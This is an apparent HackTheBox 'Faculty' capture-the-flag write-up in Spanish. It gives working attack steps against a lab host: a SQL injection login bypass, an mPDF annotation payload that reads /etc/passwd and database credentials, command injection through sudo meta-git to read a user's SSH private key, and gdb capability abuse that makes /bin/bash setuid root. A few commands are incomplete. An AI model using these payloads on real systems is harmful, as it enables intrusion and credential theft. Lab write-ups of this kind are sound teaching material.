---
layout:   post
title:    "Write Up Faculty. "
subtitle: "Starting-Point"
category:   HTB
tags:      [Medium,Linux,SQLi,Burpsuite,LFI,RCE,SSH,Write-Up-Machine,Starting-Point] 
---
![list](/assets/img/faculty/Captura%20de%20pantalla%20(186).png){:.lead width="800" height="100" loading="lazy"}

***
<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconocimiento

Fase inicial donde recolectamos toda la información posible del objetivo, 

utilizando diferentes técnicas como:

| Caracter.                                   |
|:--------------------------------------------|
|Recopilación de tecnologuias.                |
|Dominios.                                    |
|IPs.                                         |
|Puertos.                                     |
|Servicios.                                   |
|Recopilación de metadatos, etc.              |


***
### nmap

Utizando nmap comprobamos que puertos estan abiertos.


```bash
nmap -p- --open --min-rate 5000 -n -vvv -Pn 10.10.11.169 -oA allports -Pn
```
El paso anterior se debe hacer con privileguios (root).
{:.note title="Attention"}


![list](/assets/img/faculty/Kali-2022-09-06-23-39-14.png){:.lead width="800" height="100" loading="lazy"}

***
### Servicios y versiones

Una vez sabemos que puertos estan abiertos con el comandoa anterior debemos saber que 

versiones y servicios que corren en los mismo de ahi podremos determinara posibles 

vulnerabilidades.

Esto lo hacemos con el siguiente comando.


```bash
nmap -p22,8080 -sV -sC 10.10.11.183 -oN target
```
![list](/assets/img/faculty/Kali-2022-09-06-23-39-23.png){:.lead width="800" height="100" loading="lazy"}

El paso anterior no es nesesario ser (root).
{:.note title="Attention"}

***

## Analisis de vulnerabilidades

Uso de Investigacion web, Google Hacking,Google Dorks.

Recopilación de información gracias a servicios de terceros.

Ispeccionamos la web.

Inpeccionamos las tecnologias de la ip ataves de la terminal o via  web esto lo 

hacemos con wapalizzer o whatweb.


Whatweb identificar tecnologuias atraves del terminal o wappalizer atraves de la web.

![list](/assets/img/faculty/Kali-2022-09-06-23-40-34.png){:.lead width="800" height="100" loading="lazy"}
Ingresamos el dominio al /etc/hosts. 
{:.note}



Fuzzeamos la web con gobuster.

![list](/assets/img/faculty/Kali-2022-09-06-23-44-53.png){:.lead width="800" height="100" loading="lazy"}
Lo utilizamos para fuzzear virtualhosting. 
{:.note}



Inspecionamos la web y tiene dos panles de login pero el vamos a explotar es el de 

admin ya que es vulnerable a SQLinjection.

![list](/assets/img/faculty/Kali-2022-09-06-23-45-58.png){:.lead width="800" height="100" loading="lazy"}
Lo podemos burlar con una inyección simple: ' or 1=1#.
{:.note}



Obtenemos acceso al panel de administración, que tiene muchas funcionalidades nuevas 

que deben verificarse en busca de vulnerabilidades.

![list](/assets/img/faculty/Kali-2022-09-06-23-46-03.png){:.lead width="800" height="100" loading="lazy"}

Enumeramos en el panel de administración, encontré que hay un lugar para descargar pdf.

![list](/assets/img/faculty/Kali-2022-09-06-23-53-04.png){:.lead width="800" height="100" loading="lazy"}
Explore cada funcionalidad, mientras analiza las solicitudes y respuestas con Burp Suite. 
{:.note}



Si interceptamos la petición al darle al botón, vemos lo siguiente

![list](/assets/img/faculty/Kali-2022-10-24-21-32-31.png){:.lead width="800" height="100" loading="lazy"}
{:.note}
Se puede examinar la solicitud de descarga del pdf y parece ser un proceso de 
codificación en url dos veces y una en base64. 


![list](/assets/img/faculty/Kali-2022-10-24-22-45-19.png){:.lead width="800" height="100" loading="lazy"}
{:.note}
Al urldecodearlo 2 veces y decodearlo en base64 una vez obtenemos mejor formato.



Sabiendo eso intercectamos el one-lner del pdf y lo reeplamos por la petición en 

burpsuite para eso creamos un [payload] en [CyberChef] para encodearlo como se tramita 

la petición original.

[payload]: https://github.com/mpdf/mpdf/issues/356
[CyberChef]: https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)URL_Encode(false)To_Base64('A-Za-z0-9%2B/%3D')&input=PGFubm90YXRpb24gZmlsZT0iL2V0Yy9wYXNzd2QiIGNvbnRlbnQ9Ii9ldGMvcGFzc3dkIiBpY29uPSJHcmFwaCIgdGl0bGU9IkF0dGFjaGVkIEZpbGU6IC9ldGMvcGFzc3dkIiBwb3MteD0iMTk1IiAvPg

Damos a forward y mirando los Attachments del pdf encontramos el passwd que indicamos,

lo descargarmos y podemos leerlo un par de usuarios.

![list](/assets/img/faculty/Kali-2022-09-07-00-39-33.png){:.lead width="800" height="100" loading="lazy"}
{:.note}
En la parte izquierda dar click yse podra ver el contedio.



Esta página envía una solicitud a `http://faculty.htb/admin/ajax.php?action=get_schecdule`

esa url nos mostrará alguna información del sistema de archivos local 

`/var/www/scheduling/admin/admin_class.php`, con la cual podemos hacer lo mismo de antes.

Esto nos ayudará a localizar dónde se almacenan los archivos del sitio web y finalmente 

nos llevará al archivo db_connect.php y le daremos un vistazo ese `db_connect.php` con otro 

payload para ver su contenido.

```bash
curl http://faculty.htb/admin/download.php -H
```

Hay una credencial encontrada en el archivo `Co.met06aci.dly53ro.per`.

Probamos a conectarnos por ssh, y obtenemos una shell

```bash
ssh gbyolo@10.10.11.169
```

![list](/assets/img/faculty/Kali-2022-09-07-01-04-35.png){:.lead width="800" height="100" loading="lazy"}
{:.note}
A qui no esta la flag debemos pivotar hasta developer.

***
## Explotacion

Siempre es bueno ejecutar `LimEnum` Y `pspy` para monitorizar y ver los posibles 

vectores para escalar de privilegios, ademas hasta que se ejecute los anteriores 

podemos buscar los permisos con el comado find con el siguite comando.

Si miramos privilegios de sudoers podemos ejecutar meta-git como el usuario developer

![list](/assets/img/faculty/Kali-2022-10-24-22-52-21.png){:.lead width="800" height="100" loading="lazy"}
{:.note}
BUscando un poco encontramos una [vulnerabilidad] que te permite ejecutar comandos, 

podemos probarla pero solo funciona en un directorio que tenga acceso asi que desde la /.

[vulnerabilidad]: https://hackerone.com/reports/728040



Basicamente dice que el comando de clonación no se desinfectó correctamente, por lo que 

podemos usarlo para la ejecución del código. Esto debe ejecutarse desde el directorio 

/home . Podemos encontrar el id_rsa del desarrollador. 

```bash
sudo -u developer meta-git clone 'poc | whoami'
```
{:.note}
Solo para probar.



Ahora podemos leer la id_rsa para conectarnos por ssh

```bash
sudo -u developer meta-git clone 'poc | cat ~/.ssh/id_rsa'
```
{:.note}
Copiamos el contenido a un archivo id_rsa en la maquina atacate y le damos 

permisos 600 y nos conectamos via ssh.




inicie sesión para obtener la bandera de usuario.

```bash
ssh developer@10.10.11.169 -i id_rsa
```

![list](/assets/img/faculty/Kali-2022-10-24-23-14-06.png){:.lead width="800" height="100" loading="lazy"}

Siempre es bueno ejecutar `LimEnum` Y `pspy` para monitorizar y ver los posibles 

vectores para escalar de privilegios, ademas hasta que se ejecute los anteriores 

podemos buscar los permisos con el comado find con el siguite comando.

Gdb es inusual, existe un posible [exploit] en hacktricks, podemos ver que nuestro 

grupo puede ejecutarlo, además tiene una capabilitie.

[exploit]: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities

![list](/assets/img/faculty/Kali-2022-10-24-23-16-38.png){:.lead width="800" height="100" loading="lazy"}

Podemos utilizar un proceso que este ejecutando root para con gdb asignar suid a la bash.

```bash
ps faux | grep ^root | grep python3
```
{:.note}
Localizamos proceso.




```bash
gdb -p 29
```
{:.note}
atacamos el proseso en mi caso 29 es syo es otro.




```bash
call (void)system("chmod u+s /bin/bash")
```
{:.note}
En el contexto (gdb).




```bash
quit
```
{:.note}
En el contexto (gdb) y hacemos `bash -p`.




Ya lo ultimo es buscar la flag de superusuario en el escritorio de root.

***

```shell
🎉 Felicitaciones ya has comprometido Faculty de HackTheBox 🎉
```
{:.centered}
***